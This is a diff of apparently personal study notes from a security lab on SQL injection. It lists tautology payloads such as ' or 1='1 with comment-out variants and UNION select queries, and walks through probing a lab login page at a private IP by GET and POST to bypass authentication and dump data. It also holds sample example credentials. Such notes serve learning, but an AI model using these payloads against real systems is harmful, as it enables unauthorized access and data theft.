@@ -396,34 +396,96 @@ select * from session.car UNION select *,null,null from session.Tires;
 select * from session.Tires UNION select carid,name,type,cost from session.car;
 
 
+#unsanitized vs sanitized
+' = to modify backend code that utilized quotation marks
+/ = escape character
+( or ) = to close off backened code that utilizes this
+
+Gmail
+username: Johndoe243
+password: paas1234
+
+$name = Johndoe243
+$pass = paas1234
+
+#backend code
+SELECT id FROM users WHERE name='$name' AND pass='$pass';
+SELECT id FROM users WHERE name='JohnDoe243' AND pass='paas1234';
+
+Truth statemenet
+<value>' or 1='1
+
+SELECT id FROM users WHERE name='[<value>' or 1='1]' AND pass='$pass';
+SELECT id FROM users WHERE name='$name' AND pass='[<value>' or 1='1]';
+SELECT id FROM users WHERE name='[<value>' or 1='1]' AND pass='[<value>' or 1='1]';
+
+
+# = commenting out
+<value> or 1='1'; #
+SELECT id FROM users WHERE name='[<value>' or 1='1]'; #' or 1='1' AND pass='$pass';
+
+
+
+#truth statement demo
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+1. determine the behavior
+username=matt
+password=password
+#this did not work
+
+2.determine if webpage is vulnerable to SQL injection
+username=matt' or 1='1
+password=password' or 1='1
+#this did work
+
+3.Retrieved/Dump information using Get method
+http://10.50.21.1/login.php
+http://10.50.21.1/login.php?
+? = query string parameters to follow
+
+#### pay attention to the format of the web address ####
+http://10.50.21.1/login.php?username=matt'+or+1='1&passwd=password'+or+1='1
+#find the field and how they spell them in console tab > network> request after sending the or password
+
+
+
+#SQL injection - POST method
+0. Determine normalbehavior
+Only valid entries will provide information
+Toyota = Not valid entry, did not display webpage with data
+
+1. Determine if the webpage is vulnerable via Truth statement
+Truth statement
+<value>' or 1='1
+<value>' or 1='1;
+<value>' or 1='1; #
+
+Ford' or 1='1
+Ford' or 1='1;
+Ford' or 1='1; #
+
+Dodge' or 1='1
+Dodge' or 1='1;
+Dodge' or 1='1; #
+
+Honda' or 1='1
+Honda' or 1='1;
+Honda' or 1='1; #
+
+Audi' or 1='1     <=== works
+Audi' or 1='1;    <=== works
+Audi' or 1='1; #  <=== works
+
+#SQL injection - GET method
 
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#version and function
 
 
 
